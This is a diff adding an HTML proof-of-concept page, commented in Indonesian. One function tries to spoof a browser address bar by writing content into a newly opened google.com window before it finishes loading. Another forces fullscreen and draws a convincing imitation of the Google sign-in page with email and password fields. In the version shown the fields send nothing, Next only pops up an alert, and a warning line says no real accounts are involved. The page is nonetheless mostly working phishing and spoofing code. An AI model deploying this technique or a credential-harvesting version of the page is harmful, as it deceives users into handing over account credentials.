@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Google Login Redirect</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background: #f2f2f2;
+        margin: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        flex-direction: column;
+        gap: 20px;
+      }
+      .redirect-button {
+        padding: 12px 24px;
+        font-size: 16px;
+        border-radius: 6px;
+        background-color: #4285F4;
+        color: white;
+        border: none;
+        cursor: pointer;
+        box-shadow: 0 4px 12px rgba(66, 133, 244, 0.5);
+        transition: background-color 0.3s ease;
+      }
+      .redirect-button:hover {
+        background-color: #357ae8;
+      }
+      .login-container {
+        background: white;
+        padding: 40px 50px;
+        border-radius: 8px;
+        box-shadow: 0 8px 24px rgb(0 0 0 / 0.2);
+        width: 360px;
+        text-align: center;
+      }
+      .logo {
+        font-size: 48px;
+        font-weight: 700;
+        margin-bottom: 24px;
+        user-select: none;
+      }
+      .logo .g { color: #4285F4; }
+      .logo .o1 { color: #EA4335; }
+      .logo .o2 { color: #FBBC05; }
+      .logo .g2 { color: #4285F4; }
+      .logo .l { color: #34A853; }
+      .logo .e { color: #EA4335; }
+
+      h1 {
+        font-weight: 400;
+        font-size: 24px;
+        margin-bottom: 20px;
+        color: #202124;
+      }
+      input[type="email"], input[type="password"] {
+        width: 100%;
+        padding: 12px 15px;
+        margin: 8px 0 24px;
+        border: 1px solid #dadce0;
+        border-radius: 4px;
+        font-size: 16px;
+      }
+      input[type="email"]:focus, input[type="password"]:focus {
+        border-color: #4285F4;
+        outline: none;
+        box-shadow: 0 0 5px rgba(66,133,244,0.5);
+      }
+      button {
+        background-color: #4285F4;
+        color: white;
+        border: none;
+        width: 100%;
+        padding: 12px;
+        font-size: 16px;
+        border-radius: 4px;
+        cursor: pointer;
+      }
+      button:hover {
+        background-color: #357ae8;
+      }
+      .footer-text {
+        margin-top: 20px;
+        font-size: 12px;
+        color: #666;
+        user-select: none;
+      }
+      .funny-msg {
+        color: red;
+        font-weight: bold;
+        margin-top: 15px;
+        user-select: none;
+      }
+    </style>
+  </head>
+
+  <body>
+    <!-- Tombol pertama tetap spoof seperti diminta -->
+    <button class="redirect-button" onclick="spoof()">Click to spoof</button>
+
+    <!-- Tombol baru untuk redirect dan tampilkan fake Google login -->
+    <button class="redirect-button" onclick="redirectToGoogle()">Simulate Google Login</button>
+
+    <script>
+      function spoof() {
+        // Buka jendela baru pointing ke target (akan menjadi spoofed URL)
+        let win = window.open("https://www.google.com/csi", "_blank");
+
+        // Setelah 50ms, injeksikan konten sebelum navigasi selesai
+        setTimeout(() => {
+          try {
+            win.document.write(`
+              <h1>This is not Google!</h1>
+              <button onclick="alert('XSS on spoofed page')">Click me</button>
+            `);
+            win.document.close();
+          } catch (e) {
+            console.warn("Blocked by browser protections:", e);
+          }
+        }, 50);
+      }
+
+      function redirectToGoogle() {
+        const elem = document.documentElement;
+
+        // Coba masuk fullscreen
+        const goFullscreen = () => {
+          if (elem.requestFullscreen) {
+            return elem.requestFullscreen();
+          } else if (elem.webkitRequestFullscreen) {
+            return elem.webkitRequestFullscreen();
+          } else if (elem.msRequestFullscreen) {
+            return elem.msRequestFullscreen();
+          } else {
+            return Promise.resolve(); // fallback jika tidak tersedia
+          }
+        };
+
+        goFullscreen().finally(() => {
+          document.body.innerHTML = `
+            <div class="login-container">
+              <div class="logo" aria-label="Google Logo">
+                <span class="g">G</span>
+                <span class="o1">o</span>
+                <span class="o2">o</span>
+                <span class="g2">g</span>
+                <span class="l">l</span>
+                <span class="e">e</span>
+              </div>
+              <h1>Sign in to your Google Account</h1>
+              <input type="email" placeholder="Email or phone" aria-label="Email or phone" />
+              <input type="password" placeholder="Password" aria-label="Password" />
+              <button onclick="alert('Fake Google')">Next</button>
+              <div class="funny-msg">Warning: No real accounts here!</div>
+              <div class="footer-text">© 2025 Google</div>
+            </div>
+          `;
+        });
+      }
+    </script>
+  </body>
+</html>
